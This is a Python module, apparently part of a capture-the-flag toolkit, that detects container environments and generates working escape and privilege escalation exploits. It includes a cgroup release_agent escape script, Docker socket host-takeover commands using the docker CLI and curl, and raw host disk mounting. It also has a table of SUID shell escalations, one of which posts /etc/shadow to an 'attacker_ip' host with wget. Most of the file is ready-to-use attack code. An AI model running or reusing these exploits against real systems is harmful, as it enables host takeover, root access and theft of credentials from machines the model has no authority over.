"""
Container & Sandbox Escape / Linux Privilege Escalation Engine for WebCTF Suite.
Audits container environments (Docker, Kubernetes, LXC) and provides automated exploit
generators for Docker daemon sockets, cgroup release_agent, SUID binaries, and host mounts.
"""

import re
from typing import Dict, List, Any, Optional, Callable

class ContainerEscapeAdvisor:
    """
    Analyzes remote shell outputs and crafts privilege escalation and container escape scripts.
    """

    # ─── CONTAINER ENVIRONMENT RECONNAISSANCE ───────────────────────────
    @staticmethod
    def get_recon_commands() -> List[Dict[str, str]]:
        """List of non-intrusive commands to detect containerized environments."""
        return [
            {"name": "Check .dockerenv", "cmd": "test -f /.dockerenv && echo 'IS_DOCKER' || echo 'NO_DOCKERENV'"},
            {"name": "Check cgroup markers", "cmd": "cat /proc/1/cgroup 2>/dev/null | grep -E 'docker|kubepods|containerd|lxc' || echo 'CLEAN_CGROUP'"},
            {"name": "Check Docker Socket", "cmd": "test -S /var/run/docker.sock && echo 'DOCKER_SOCK_ACCESSIBLE' || ls -la /var/run/docker.sock 2>/dev/null || echo 'NO_SOCK'"},
            {"name": "Check Container Capabilities", "cmd": "cat /proc/1/status 2>/dev/null | grep -i CapEff || capsh --print 2>/dev/null || echo 'NO_CAPS'"},
            {"name": "Check Mounted Devices / Host FS", "cmd": "mount 2>/dev/null | grep -E 'docker|host|/dev/sd|/dev/nvme' || df -h"},
            {"name": "Check SUID Binaries", "cmd": "find / -perm -4000 -type f 2>/dev/null | grep -vE '/proc|/sys' | head -n 30"}
        ]

    # ─── EXPLOIT SCRIPT GENERATORS ─────────────────────────────────────
    @staticmethod
    def generate_cgroup_escape_script(cmd: str = "cat /root/flag* > /tmp/pwned_flag.txt", mount_dir: str = "/tmp/cgrp") -> str:
        """
        Generate cgroup v1 release_agent exploit script for privileged containers (CAP_SYS_ADMIN).
        """
        script = f"""#!/bin/sh
# Exploit: cgroup v1 release_agent Container Escape (CAP_SYS_ADMIN)
set -e
mkdir -p {mount_dir}
mount -t cgroup -o memory cgroup {mount_dir} 2>/dev/null || mount -t cgroup -o rdma cgroup {mount_dir}
mkdir -p {mount_dir}/x
echo 1 > {mount_dir}/x/notify_on_release

# Find the container overlay path on the host
host_path=$(sed -n 's/.*\\perdir=\\([^,]*\\).*/\\1/p' /etc/mtab)
if [ -z "$host_path" ]; then
    host_path=$(cat /proc/mounts | grep -m1 'overlay' | sed -n 's/.*\\perdir=\\([^,]*\\).*/\\1/p')
fi
if [ -z "$host_path" ]; then
    host_path="/tmp"
fi

# Create payload script to be executed by host kernel
echo '#!/bin/sh' > /tmp/escape_payload.sh
echo '{cmd}' >> /tmp/escape_payload.sh
chmod +x /tmp/escape_payload.sh

# Trigger host execution via release_agent
echo "$host_path/tmp/escape_payload.sh" > {mount_dir}/release_agent
sh -c "echo \\$\\$ > {mount_dir}/x/cgroup.procs"
sleep 1
cat /tmp/pwned_flag.txt 2>/dev/null || true
"""
        return script

    @staticmethod
    def generate_docker_socket_exploit(socket_path: str = "/var/run/docker.sock", flag_cmd: str = "cat /root/flag*") -> Dict[str, str]:
        """
        Generate Docker socket host takeover techniques (CLI & direct UNIX socket HTTP API curl).
        """
        cli_cmd = f"docker -H unix://{socket_path} run -v /:/host_root -it alpine chroot /host_root /bin/sh -c '{flag_cmd}'"
        
        # Raw curl interaction over UNIX socket
        raw_curl = f"""# 1. Create a container mounting host filesystem at /mnt/host
curl -s --unix-socket {socket_path} -X POST -H 'Content-Type: application/json' \\
  -d '{{"Image":"alpine","Cmd":["/bin/sh","-c","{flag_cmd} > /mnt/host/tmp/host_flag.txt"],"Binds":["/:/mnt/host"]}}' \\
  http://localhost/containers/create?name=pwn_container

# 2. Start container to execute host command
curl -s --unix-socket {socket_path} -X POST http://localhost/containers/pwn_container/start

# 3. Read extracted loot
cat /tmp/host_flag.txt 2>/dev/null
"""
        return {
            "Docker CLI One-Liner": cli_cmd,
            "Raw UNIX Socket cURL Exploit": raw_curl,
            "Explanation": "Mounts host filesystem '/' into an ephemeral privileged container to extract host root flags."
        }

    @staticmethod
    def generate_raw_disk_mount_exploit(disk_dev: str = "/dev/sda1", mount_point: str = "/tmp/host_disk") -> str:
        """
        Generate commands to directly mount host partition when container has raw device access.
        """
        return f"""mkdir -p {mount_point}
mount {disk_dev} {mount_point}
cat {mount_point}/root/flag* 2>/dev/null || find {mount_point} -name "*flag*" 2>/dev/null
umount {mount_point} 2>/dev/null
"""

    # ─── LINUX PRIVESC ADVISOR ─────────────────────────────────────────
    @staticmethod
    def audit_suid_binary(binary_name: str) -> Optional[str]:
        """
        Match GTFOBins SUID privilege escalation vectors for common binaries.
        """
        b_name = binary_name.split("/")[-1].lower()
        gtfobins = {
            "find": "find . -exec /bin/sh -p \\; -quit",
            "bash": "bash -p",
            "cp": "cp /bin/sh /tmp/sh && chmod +s /tmp/sh",
            "env": "env /bin/sh -p",
            "vim": "vim -c ':!/bin/sh'",
            "vi": "vi -c ':!/bin/sh'",
            "nano": "nano -> Ctrl+R, Ctrl+X -> reset; sh 1>&0 2>&0",
            "python": "python -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'",
            "python3": "python3 -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'",
            "php": "php -r \"pcntl_exec('/bin/sh', ['-p']);\"",
            "perl": "perl -e 'exec \"/bin/sh -p\";'",
            "ruby": "ruby -e 'exec \"/bin/sh -p\"'",
            "gdb": "gdb -nx -ex '!sh -p' -ex quit",
            "awk": "awk 'BEGIN {system(\"/bin/sh -p\")}'",
            "base64": "base64 /etc/shadow | base64 -d",
            "curl": "curl file:///etc/shadow",
            "wget": "wget --post-file=/etc/shadow http://attacker_ip",
            "chmod": "chmod 4755 /bin/dash",
            "chown": "chown root /tmp/rootshell && chmod 4755 /tmp/rootshell",
            "docker": "docker run -v /:/mnt -it alpine chroot /mnt /bin/sh",
            "pkexec": "pkexec /bin/sh (or CVE-2021-4034 PwnKit)"
        }
        return gtfobins.get(b_name)

    @classmethod
    def analyze_shell_recon(cls, output: str) -> Dict[str, Any]:
        """
        Analyze terminal reconnaissance output to identify high-probability container escapes.
        """
        findings = {
            "is_container": False,
            "container_type": "Unknown",
            "escapes": [],
            "suid_exploits": []
        }

        # 1. Container Detection
        if "IS_DOCKER" in output or "docker" in output.lower() or "containerd" in output.lower():
            findings["is_container"] = True
            findings["container_type"] = "Docker / Containerd"
        elif "kubepods" in output.lower():
            findings["is_container"] = True
            findings["container_type"] = "Kubernetes Pod"
        elif "lxc" in output.lower():
            findings["is_container"] = True
            findings["container_type"] = "LXC Container"

        # 2. Docker Socket Mount
        if "DOCKER_SOCK_ACCESSIBLE" in output or "/var/run/docker.sock" in output:
            findings["escapes"].append({
                "type": "Docker Socket Mounted (/var/run/docker.sock)",
                "risk": "Critical (Immediate Host Takeover)",
                "exploit": cls.generate_docker_socket_exploit()["Docker CLI One-Liner"]
            })

        # 3. Privileged Container (CapEff / CAP_SYS_ADMIN)
        if "0000003fffffffff" in output or "0000001fffffffff" in output or "cap_sys_admin" in output.lower():
            findings["escapes"].append({
                "type": "Privileged Container (CAP_SYS_ADMIN)",
                "risk": "Critical (Host Kernel Escape)",
                "exploit": "Run cgroup v1 release_agent escape script."
            })

        # 4. SUID Binaries
        for line in output.splitlines():
            line_clean = line.strip()
            if line_clean.startswith("/"):
                b_name = line_clean.split("/")[-1]
                exploit = cls.audit_suid_binary(b_name)
                if exploit:
                    findings["suid_exploits"].append({
                        "binary": line_clean,
                        "exploit": exploit
                    })

        return findings
